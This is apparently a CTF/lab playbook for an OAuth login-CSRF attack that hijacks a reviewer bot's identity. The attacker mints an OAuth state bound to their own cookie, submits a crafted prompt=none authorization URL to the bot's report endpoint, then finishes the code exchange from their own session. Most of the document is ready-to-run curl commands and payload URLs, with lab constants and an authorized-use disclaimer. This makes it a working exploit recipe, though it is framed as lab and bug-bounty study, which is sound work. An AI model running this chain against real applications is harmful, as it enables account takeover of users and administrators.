# Crafted OAuth Link CSRF — Review Bot Takeover

## Context

Use only in authorized labs, owned applications, in-scope bug bounty targets, or defensive validation.

Apply when:

- app sets a pre-OAuth cookie (e.g. `tk`) on landing page
- `/init` mints server-side OAuth `state` tied to that cookie
- reviewer/admin bot submits URLs via `POST /report` (or similar)
- bot has active IdP session (`prompt=none` works)
- victim callback stages code server-side — attacker completes with `GET /auth` alone
- **no** code exfil primitive required (no `/logger`, no open redirect on callback)

Do **not** use sl3 hybrid+logger template when this staging behavior is present.

## Prerequisites

```bash
SL='https://[app-host]'
G='https://[idp-host]'

curl -sS -c /tmp/att.txt "$SL/" -o /dev/null
STATE=$(curl -sS -b /tmp/att.txt "$SL/init" -D - -o /dev/null \
  | grep -i '^location:' | sed 's/.*state=//' | cut -d'&' -f1)
echo "STATE=$STATE"
```

Save `/tmp/att.txt` (contains `tk`).

## Payload (report URL directly)

No hosted HTML required. Report the OAuth URL itself:

```text
https://[idp-host]/o/oauth2/v2/auth?client_id=[client_id]&redirect_uri=https%3A%2F%2F[app-host]%2Fcallback&response_type=code&scope=openid%20email%20profile&prompt=none&state=[ATTACKER_STATE]
```

### curl report

```bash
OAUTH="${G}/o/oauth2/v2/auth?client_id=solo-leveling-2-client&redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${SL}/callback'))")&response_type=code&scope=openid%20email%20profile&prompt=none&state=${STATE}"

curl -sS -b /tmp/att.txt -X POST "$SL/report" --data-urlencode "url=${OAUTH}"
```

## Completion (attacker)

```bash
sleep 5
curl -sS -b /tmp/att.txt "$SL/auth" -L
curl -sS -b /tmp/att.txt "$SL/profile"
```

## Expected signal

- `/profile` shows privileged reviewer identity (lab: **Statue of God**)
- Attacker never had `code=` in their browser history
- Works with standard `response_type=code` (hybrid `code token` unnecessary)

## Why it works

Server binds OAuth `state` to attacker's `tk` at `/init`. Victim's IdP login produces `code` for that `state` on `/callback`. Server stages code; attacker's `/auth` with matching `tk` completes exchange cross-browser.

## Why hybrid/logger exfil fails as primary path

- sl2 removes `/logger`
- suffix `redirect_uri` bypass may be rejected by IdP
- staging makes exfil redundant — test `/auth`-only completion first

## Solo Leveling sl2 constants

| Item | Value |
|------|-------|
| `client_id` | `solo-leveling-2-client` |
| `redirect_uri` | `https://[instance].pwnbox-lab.com/callback` |
| IdP host | `https://google-[instance-id].pwnbox-lab.com` |
| Report | `POST /report` field `url` |

## Related

- `notes/oauth-tk-state-csrf-staged-code-exchange.md`
- `writeups/solo-leveling-state-gate-oauth-csrf.md`
- `labs/2026-07-11-solo-leveling-state-gate-oauth-csrf.md`
